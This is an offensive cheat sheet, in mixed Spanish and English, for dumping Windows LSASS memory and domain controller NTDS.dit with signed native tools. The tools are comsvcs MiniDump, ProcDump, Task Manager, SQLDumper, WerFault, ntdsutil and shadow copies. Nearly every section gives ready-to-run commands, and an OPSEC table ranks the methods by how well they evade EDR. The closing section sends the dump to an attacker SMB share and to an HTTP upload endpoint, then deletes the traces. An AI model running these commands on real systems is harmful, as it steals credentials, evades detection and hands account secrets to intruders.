---
aliases:
  - comsvcs MiniDump
  - procdump LSASS
  - taskmgr lsass
  - LOLBins LSASS
tags:
  - type/technique
  - technique/credential-access
  - env/windows
  - asset/active-directory
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[LSASS Dumping]]"
---
# LSASS Dumping - Native LOLBins

***

## comsvcs.dll MiniDump (Native Windows)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `tasklist /FI "IMAGENAME eq lsass.exe"` | Get LSASS PID | Pre-dump. |
| `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\temp\lsass.dmp full` | Native MiniDump (sin Mimikatz binary) | Stealth. |
| `powershell -c "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full"` | PS variant | Inline. |
^lsass-lol-comsvcs

**Por qué stealth:** `comsvcs.dll` = signed Microsoft DLL. `MiniDump` exported function = legitimate API. No binary suspicious dropped. EDR signature on `mimikatz.exe` no matchea.

```cmd
:: Standard pipeline
for /f "tokens=2 delims= " %a in ('tasklist /FI "IMAGENAME eq lsass.exe" /NH') do set LSASS_PID=%a
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump %LSASS_PID% C:\temp\lsass.dmp full

:: Exfil + parse offline
:: pypykatz lsa minidump lsass.dmp
```

___

## ProcDump (Sysinternals)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `procdump.exe -accepteula -ma lsass.exe lsass.dmp` | Full memory dump LSASS | Standard signed tool. |
| `procdump.exe -accepteula -ma <PID> lsass.dmp` | Por PID | Alt. |
| `procdump64.exe -accepteula -ma lsass.exe lsass.dmp -h` | Snapshot mode (handle-based, less detect) | Modern stealth. |
^lsass-lol-procdump

**Por qué útil:** ProcDump = signed Sysinternals tool. Microsoft-signed = bypass cualquier EDR signature en mimikatz.

**Caveat moderno:** Defender for Endpoint detecta ProcDump en LSASS específicamente desde 2021. EDR-evasion = renombrar binary o usar `-h` snapshot mode.

```cmd
:: Download Sysinternals (signed)
:: https://download.sysinternals.com/files/Procdump.zip

:: Standard dump
procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp

:: Snapshot mode (less detect)
procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp -h
```

___

## Task Manager (GUI)

| **Step** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| 1. Open Task Manager elevated | UI native | Manual. |
| 2. Details tab → find `lsass.exe` | Locate process | Standard. |
| 3. Right-click → "Create dump file" | Native UI dump | Workstation interactive. |
| 4. Output: `%AppData%\Local\Temp\lsass.DMP` | Default path | Exfil. |
^lsass-lol-taskmgr

**Cuando usar:** session interactive (RDP / console) en host comprometido. EDR raramente alerta sobre Task Manager dump.

___

## SQLDumper (Office / SQL Server)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `"C:\Program Files\Common Files\Microsoft Shared\OFFICE16\SQLDUMPER.EXE" 0x01b6 0 0x0110` | Office signed dumper (PID 0x01b6 dec) | Office installed. |
| `"C:\Program Files\Microsoft SQL Server\<ver>\Shared\SQLDumper.exe" <PID> 0 0x01100` | SQL Server variant | SQL installed. |
^lsass-lol-sqldumper

**Por qué:** SQLDumper = Microsoft-signed minidump utility. Bypass EDR signature on procdump.exe.

___

## WerFault (Windows Error Reporting)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `WerFault.exe -u -p <LSASS-PID> -s 0` | Trigger Windows Error Reporting dump | Edge — partial dump. |
^lsass-lol-werfault

**Caveat:** WerFault output dump usually incompleto (partial). Crash semantics. Less reliable.

___

## ntdsutil snapshot (Edge — DCs)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `ntdsutil snapshot create quit quit` | DC snapshot via ntdsutil | DC alt method. |
| Mount snapshot → access NTDS.dit | DC offline data | Adjacent. |
^lsass-lol-ntdsutil

**Caveat:** ntdsutil dump NTDS.dit (database), no LSASS memory directamente. Adjacent technique para hash extraction.

___

## VSS Snapshot (Volume Shadow Copy)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `vssadmin create shadow /for=C:` | VSS snapshot del C: drive | DC NTDS dump. |
| `wmic shadowcopy call create Volume='C:\'` | VSS via WMI | Alt. |
| `Get-WmiObject Win32_ShadowCopy` (PS) | Verify snapshot | Standard. |
| `cp \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>\Windows\NTDS\ntds.dit C:\temp\` | Copy NTDS desde snapshot | DC dump. |
^lsass-lol-vss

```cmd
:: VSS pipeline DC
vssadmin create shadow /for=C:
:: Output: Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>

:: Copy NTDS
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\

:: Cleanup
vssadmin delete shadows /for=C: /quiet
```

___

## OPSEC Comparison

| **Method** | **Stealth** | **EDR Detection** |
|:---:|:---:|:---:|
| Mimikatz `sekurlsa::logonpasswords` | Low | Almost universal alert. |
| `comsvcs.dll MiniDump` | High | Native — many EDRs miss. |
| ProcDump | Medium | Defender signature post-2021. |
| Task Manager GUI | High | Almost no detect. |
| SQLDumper / WerFault | High | Edge LOLBin coverage. |
| nanodump (BOF / EXE) | High | Custom, EDR-evasion focus. |
| VSS snapshot | Medium | Audit Event 5400 si SACL. |
^lsass-lol-comparison

___

## Common Errors

| **Error** | **Causa** | **Fix** |
|:---:|:---:|:---:|
| `Access denied` (PID open) | LSASS Protected (RunAsPPL) | Modern protection. |
| `comsvcs.dll not found` | Wrong path / wrong arch | Verify `C:\Windows\System32\comsvcs.dll`. |
| Output dump 0 bytes | LSASS protected o EDR blocking write | Try alt method. |
| `procdump: process not found` | Wrong PID | Refresh `tasklist` output. |
| `WerFault.exe failed` | LSASS process state | Edge case. |
^lsass-lol-errors

___

## Exfil Strategy

| **Method** | **Comando** | **Cuándo** |
|:---:|:---:|:---:|
| SMB share write | `copy lsass.dmp \\<attacker-IP>\share\` | Lateral exfil. |
| WebDAV upload | PROPFIND/PUT custom | HTTP exfil. |
| HTTP POST | `Invoke-WebRequest -Method Post -Uri http://<attacker>/upload -InFile lsass.dmp` | PS native. |
| Base64 encode + clipboard | Manual chunks | Last resort. |
| Compress + encrypt pre-exfil | `Compress-Archive` + 7z encryption | OPSEC. |
^lsass-lol-exfil

```powershell
# PowerShell exfil
Compress-Archive -Path C:\temp\lsass.dmp -DestinationPath C:\temp\dump.zip
Invoke-WebRequest -Method Post -Uri http://attacker:8080/upload -InFile C:\temp\dump.zip
Remove-Item C:\temp\lsass.dmp,C:\temp\dump.zip -Force
```

***
